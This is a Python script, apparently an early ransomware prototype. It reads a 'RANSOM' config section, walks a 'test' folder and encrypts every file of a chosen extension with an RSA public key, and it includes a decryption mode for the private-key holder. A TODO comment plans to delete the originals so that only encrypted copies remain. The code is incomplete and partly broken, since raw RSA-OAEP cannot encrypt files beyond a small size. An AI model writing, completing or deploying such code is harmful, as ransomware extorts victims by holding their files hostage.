"""
Based on an example of asymmetric encryption in Python
https://gist.github.com/syedrakib/241b68f5aeaefd7ef8e2
"""
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import base64
import argparse
import sys
import os
import keygen
import configparser

params = configparser.ConfigParser()
params.read('params.ini')


def encrypt(content, publickey):
    cipher = PKCS1_OAEP.new(publickey)
    encrypted_content = cipher.encrypt(content)
    encoded_encrypted_msg = base64.b64encode(encrypted_content) # base64 encoded strings are database friendly
    return encoded_encrypted_msg


def decrypt(content, privatekey):
    cipher = PKCS1_OAEP.new(privatekey)
    decoded_encrypted_content = base64.b64decode(content)
    decoded_decrypted_content = cipher.decrypt(decoded_encrypted_content)
    return decoded_decrypted_content


def main(enc=None, filename=None):
    parser = argparse.ArgumentParser()

    # encryption (set to 1 for enc, 0 for dec)
    parser.add_argument('-enc', help='Encrypt/Decrypt - Set to 1 for Encryption, 0 for Decryption')

    args = parser.parse_args()

    if not (enc and args.enc):
        enc = input('Enter 1 for encryption, 0 for decryption: ')

    if args.enc == '1':
        try:
            public_key = RSA.importKey(open(params['RANSOM']['public'], 'rb').read())
            for file in os.listdir('test'):
                if file.endswith(params['RANSOM']['ext2encrypt']):
                    original = open('test/'+file, 'rb').read()
                    # TODO: after reading, delete the file so that it can be replaced by our encrypted equivalent
                    encrypted_file = encrypt(original, public_key)
                    with open('test/'+file.replace('.', '_') + '_encrypted', 'wb') as out_file:
                        out_file.write(encrypted_file)

        except Exception as e:
            print('Problem with reading public key')
            print(e)

            return None

    else:
        try:
            private_key = RSA.importKey(open(params['RANSOM']['private'], 'rb').read())
            for file in os.listdir('test'):
                if file.endswith("_encrypted"):
                    enc_file = open('test/'+file, 'rb').read()
                    decrypted_file = decrypt(enc_file, private_key)
                    os.remove('test/'+file)
                    with open('test/'+file.replace('_', '.').rsplit('.', 1)[0], 'w') as dec_file:
                        dec_file.write(decrypted_file.decode('utf-8'))

        except Exception as e:
            print('Problem with private key')
            print(e)

            return None

    # print("%s - (%d)\n" % (privatekey.exportKey() , len(privatekey.exportKey())))
    # print("%s - (%d)\n" % (publickey.exportKey() , len(publickey.exportKey())))
    # print("Original content: %s - (%d)" % (in_file, len(in_file)))
    # print("Encrypted message: %s - (%d)" % (encrypted_msg, len(encrypted_msg)))
    # print("Decrypted message: %s - (%d)" % (decrypted_msg, len(decrypted_msg)))


if __name__=="__main__":
    main(sys.argv)